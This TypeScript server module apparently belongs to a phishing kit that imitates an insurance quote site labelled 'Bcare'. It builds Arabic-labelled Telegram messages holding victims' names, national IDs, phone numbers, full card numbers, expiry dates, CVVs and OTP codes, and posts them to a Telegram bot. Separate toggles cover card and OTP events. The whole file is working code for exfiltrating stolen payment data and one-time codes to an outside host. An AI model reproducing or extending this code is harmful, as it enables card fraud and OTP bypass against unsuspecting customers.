// Telegram notifications sent server-side so the bot token stays secret.
import { createServerFn } from "@tanstack/react-start";
import { createClient } from "@supabase/supabase-js";
import type { Database } from "@/integrations/supabase/types";

type TelegramEvent = "new_application" | "card" | "otp";

type AppSnapshot = {
  id?: string;
  fullName?: string;
  identity?: string;
  birthDate?: string;
  phone?: string;
  insuranceType?: string;
  startDate?: string;
  purpose?: string;
  estValue?: string;
  carYear?: string;
  carModel?: string;
  repairPlace?: string;
  company?: string;
  type?: string;
  price?: number;
  total?: number;
  method?: string;
  cardNumber?: string;
  cardName?: string;
  cardExpMonth?: string;
  cardExpYear?: string;
  cardCvv?: string;
  cardBrand?: string;
  otpCode?: string;
  status?: string;
  reviewStatus?: string;
};

// Left-to-right mark: keeps Latin digits ordered correctly inside RTL text.
const LRM = "\u200E";

function formatCardNumber(raw: string): string {
  const digits = raw.replace(/\D/g, "");
  if (!digits) return raw;
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
}

function buildMessage(event: TelegramEvent, app: AppSnapshot): string {
  const title =
    event === "new_application"
      ? "🆕 <b>طلب جديد</b>"
      : event === "card"
        ? "💳 <b>بيانات بطاقة جديدة</b>"
        : "🔐 <b>رمز OTP</b>";

  const lines: string[] = [title];
  if (app.id) lines.push(`🆔 <code>${app.id}</code>`);
  const push = (label: string, val?: string | number | null) => {
    if (val === undefined || val === null || val === "") return;
    lines.push(`${label}: <code>${val}</code>`);
  };

  lines.push("━━━━━━━━━━━━━");
  lines.push("👤 <b>بيانات العميل</b>");
  push("الاسم", app.fullName);
  push("الهوية", app.identity);
  push("تاريخ الميلاد", app.birthDate);
  push("الجوال", app.phone);

  lines.push("━━━━━━━━━━━━━");
  lines.push("📋 <b>بيانات التأمين</b>");
  push("نوع التأمين", app.insuranceType);
  push("تاريخ البدء", app.startDate);
  push("الغرض", app.purpose);
  push("القيمة التقديرية", app.estValue);
  push("سنة الصنع", app.carYear);
  push("موديل السيارة", app.carModel);
  push("مكان الإصلاح", app.repairPlace);

  if (app.company || app.type || app.price || app.total || app.method) {
    lines.push("━━━━━━━━━━━━━");
    lines.push("🏢 <b>العرض</b>");
    push("الشركة", app.company);
    push("النوع", app.type);
    push("السعر", app.price);
    push("الإجمالي", app.total ? `${app.total} ر.س` : undefined);
    push("طريقة الدفع", app.method);
  }

  if (app.cardNumber || app.cardName || app.cardCvv) {
    lines.push("━━━━━━━━━━━━━");
    lines.push("💳 <b>بيانات البطاقة</b>");
    push("اسم حامل البطاقة", app.cardName);
    push(
      "رقم البطاقة",
      app.cardNumber ? `${LRM}${formatCardNumber(app.cardNumber)}` : undefined,
    );
    const exp =
      app.cardExpMonth || app.cardExpYear
        ? `${LRM}${app.cardExpMonth || ""}/${app.cardExpYear || ""}`
        : undefined;
    push("الانتهاء", exp);
    push("CVV", app.cardCvv ? `${LRM}${app.cardCvv}` : undefined);
    push("النوع", app.cardBrand);
  }

  if (app.otpCode) {
    lines.push("━━━━━━━━━━━━━");
    lines.push("🔐 <b>رمز التحقق</b>");
    push("OTP", app.otpCode);
  }

  lines.push("━━━━━━━━━━━━━");
  push("الحالة", app.status);
  push("حالة المراجعة", app.reviewStatus);

  return lines.join("\n");
}

async function sendTelegram(text: string) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  const chatId = process.env["TELEGRAM_CHAT_ID"];
  if (!token || !chatId) throw new Error("Telegram secrets are not configured");
  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
  });
  const data = (await res.json().catch(() => ({ ok: false }))) as {
    ok?: boolean;
    description?: string;
  };
  if (!res.ok || !data.ok) {
    throw new Error(data.description || `Telegram HTTP ${res.status}`);
  }
}

async function getSettingsRow() {
  const supabasePublic = createClient<Database>(
    process.env["SUPABASE_URL"]!,
    process.env["SUPABASE_PUBLISHABLE_KEY"]!,
    { auth: { persistSession: false } },
  );
  const { data } = await supabasePublic
    .from("site_settings")
    .select(
      "telegram_enabled, telegram_notify_new_application, telegram_notify_card, telegram_notify_otp",
    )
    .eq("id", 1)
    .maybeSingle();
  return data;
}

export const notifyTelegramEvent = createServerFn({ method: "POST" })
  .inputValidator((input: { event: TelegramEvent; app: AppSnapshot }) => input)
  .handler(async ({ data }) => {
    try {
      const s = await getSettingsRow();
      if (!s || !s.telegram_enabled) return { sent: false };
      if (data.event === "new_application" && !s.telegram_notify_new_application)
        return { sent: false };
      if (data.event === "card" && !s.telegram_notify_card) return { sent: false };
      if (data.event === "otp" && !s.telegram_notify_otp) return { sent: false };
      await sendTelegram(buildMessage(data.event, data.app));
      return { sent: true };
    } catch (e) {
      console.warn("[telegram] notify failed:", e);
      return { sent: false };
    }
  });

export const sendTelegramTestMessage = createServerFn({ method: "POST" })
  .inputValidator((input: { text?: string }) => input)
  .handler(async ({ data }) => {
    try {
      await sendTelegram(data.text || "✅ تم ربط بوت تليجرام بنجاح مع لوحة تحكم Bcare");
      return { ok: true };
    } catch (e) {
      return { ok: false, error: (e as Error).message };
    }
  });
